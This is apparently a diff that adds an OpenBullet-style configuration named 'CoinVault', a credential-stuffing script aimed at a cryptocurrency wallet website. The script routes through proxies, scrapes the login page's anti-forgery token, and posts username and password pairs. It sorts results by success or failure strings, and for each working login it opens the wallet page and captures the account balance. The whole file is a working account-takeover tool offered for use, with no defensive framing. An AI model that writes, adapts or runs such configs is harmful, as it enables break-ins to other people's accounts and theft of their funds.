@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "CoinVault",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-05T21:33:41.5405756+05:30",
+  "AdditionalInfo": "",
+  "Author": "k4rox",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.coinvault.io/Account/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />" -> VAR "token" 
+
+REQUEST POST "https://www.coinvault.io/Account/Login" 
+  CONTENT "__RequestVerificationToken=<token>&Email=<USER>&Password=<PASS>&RememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.coinvault.io" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://www.coinvault.io" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.coinvault.io/Account/Login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<a href=\"/Account/Manage\">Profile</a>" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+
+REQUEST GET "https://www.coinvault.io/wallet/Wallet" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"balancetop\">" "</p></div>" -> CAP "Balance" 
+
